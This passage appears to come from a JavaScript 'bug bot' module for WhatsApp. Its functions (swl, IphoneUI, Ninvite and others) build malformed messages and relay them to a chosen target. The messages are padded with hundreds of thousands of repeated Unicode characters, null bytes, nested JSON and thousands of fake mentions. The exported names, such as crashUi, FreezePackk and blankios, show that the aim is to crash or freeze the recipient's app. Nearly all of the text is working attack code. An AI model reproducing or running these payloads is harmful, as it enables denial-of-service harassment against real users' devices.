        directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
        fileLength: null,
        mediaKeyTimestamp: 1710000000,
        firstFrameLength: 999,
        firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
        isAnimated: true,
        pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
        contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1999,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
                    interactiveAnnotations: [
                        {
                            polygonVertices: [
                                { x: 0.1, y: 0.1 },
                                { x: 0.9, y: 0.1 },
                                { x: 0.9, y: 0.9 },
                                { x: 0.1, y: 0.9 }
                            ],
                            location: {
                                latitude: -6.2088,
                                longitude: 106.8456,
                                name: `Iam satz`
                            }
                        }
                    ]
                },
        stickerSentTs: 1710000000,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        accessibilityLabel: "\u0000".repeat(10000),
        mediaKeyDomain: null
    }
};
  
      await sock.relayMessage(target, stickers, {
        participant: { jid: target },
        messageId: null
        });
}

async function swl(sock, target) {
    if (!target) throw new Error("Target wajib diisi!");
    
    console.log('Otw Kirim💀...');
    
    const x = "𑜦𑜠".repeat(5000);
    
    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Iam satz" + x,
                        locationMessage: {
                            degreesLatitude: 990-9,
   degreesLongitude: -880,
                   name: x,
                        isHd: true,
                         isLive: true
          },
                        hasMediaAttachment: true
                        },
                    body: {
                        text: "Iam satz " + "𑜦𑜠".repeat(5000)  
                    },
                    nativeFlowMessage: {
                        buttons: [
                         {
                                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
                            },
                           {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "open_flow",
                  flow_message_version: "4",
                  flow_id: "satz",
                  nested: {
                    messageParamsJson: JSON.stringify({
                      layer1: {
                        payload: x,
                        layer2: {
                          messageParamsJson: JSON.stringify({
                            key: "\u0000".repeat(12000),
                            list: [null, "\u0000".repeat(10000), {}]
                          })
                        }
                      }
                    })
                  }
                })
              }
                        ],
                    },
                    contextInfo: {
                        interactiveAnnotations: [
                            {
                                polygonVertices: [
                                    { x: 0.09, y: 0.177 },
                                    { x: 0.57, y: 0.198 },
                                    { x: 0.5, y: 0.500 },
                                    { x: 0.16, y: 0.56 }
                                ],
                                shouldSkipConfirmation: false,
                                statusLinkType: 1,
                                location: {
                                    latitude: 6.2088,
                                    longitude: -106.8456,
                                    name: "Iam satz",
                                    address: x
                                }
                            }
                        ]
                    }
                }
            }
        }
    };
    
  
    await new Promise(r => setTimeout(r, 2000 + Math.random() * 2000));
    
 
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            await sock.relayMessage(target, msg, {});
            console.log(`✅ Succex! (Ke ${attempt})`);
            return true;
        } catch (e) {
            console.log(`⚠️ Percobaan ${attempt} gagal: ${e.message}`);
            if (attempt === 3) throw e;
            await new Promise(r => setTimeout(r, 3000 * attempt));
        }
    }
}

async function IphoneUI(sock, target) {
  const ButtonsMine = []; 
  
  const Nanas = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "jual nanas bng?", 
            locationMessage: {
              degressLatitude: 0,
              degrassLongtitude: -0,
            },
            hasMediaAttachMent: false,
          },
          body: {
            text: "bng mau beli" +
              "beli apa dekk?".repeat(40000) +
              "beli nanas muda bng".repeat(35000) +
              "https://t.me/makkontol".repeat(30000)
          },
          nativeFlowMessage: {
            buttons: ButtonsMine,
            messageParamsJson: "{{".repeat(10000)
          },
          contextInfo: {
            stanzaId: "X" + Date.now(),
            isForwarded: true,
            forwardingScore: 99999,
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            remoteJid: "X",
            quotedMessage: {
              extendedTextMessage: {
                text: "NanasMuda" + "꧀".repeat(25000) + "@5".repeat(50000),
                contextInfo: {
                  conversation: " " + "꧀".repeat(70000)
                },
              },
            },
          },
        },
      },
    },
  };
  
  const Muda = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_...",
          fileLength: { low: 1, high: 0, unsigned: false },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: true },
          isAnimated: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1990 }, () =>
                "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
              ),
            ],
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, Nanas, {
    messageId: null,
    participants: { jid: target }
  });
  
  await sock.relayMessage(target, Muda, {
    messageId: null,
    participants: { jid: target }
  });
  
  console.log("Succes Send IphoneUI"); 
}

async function Ninvite(sock, target) {
 await sock.relayMessage(target, {
  newsletterAdminInviteMessage: {
   newsletterJid: "120363321780343299@newsletter",
   newsletterName: " ⃟✭./𝑵𝒕𝒆𝒅𝑽𝟏𝑺𝒕. ✦╶►" + "ꦾ".repeat(240000) + "ꦽ".repeat(50000),
   caption: " ⃟✭./𝑵𝒕𝒆𝒅𝑽𝟏𝑺𝒕. ✦╶►" + "ꦾ".repeat(240000) + "ꦽ".repeat(50000),
   inviteExpiration: "999999999"
  }
 }, Ptcp ? { participant: { jid: target }} : {});
}
    
module.exports = {
  activeConnections,
  biz,
  mess,
  FriendFcAntiBlock,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  gsIntX,
  startUserSessions,
  disconnectAllActiveConnections,
  delayNew,
  FreezePackk,
  invsNewIos,
  XMmL,
  IphoneUI,
  sleep,
  permenCall,
  XiosSejaya,
  clickCrashBlankDelay,
  killeruimsg,
  nullotaxx,
  XCursedNFBlank,
  blankios,
  DelayHardCore,
  fcinvisotax,
  RaysDocuStunt,
  xCursedCrott,
  xCursedCrawl,
  yurikainvisible,
  SDXBLANK,
  crashUi,
  FriendBerulah,
  fcinvis,
  delay3,
  delaybuld,
  swl,
  XiosBugger,
  Xospaminvis,
  XoContact,
  Ninvite,
  delayFX,
  Atut,
  delaytriger,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
  quizzzz,
  GCquizzzz
};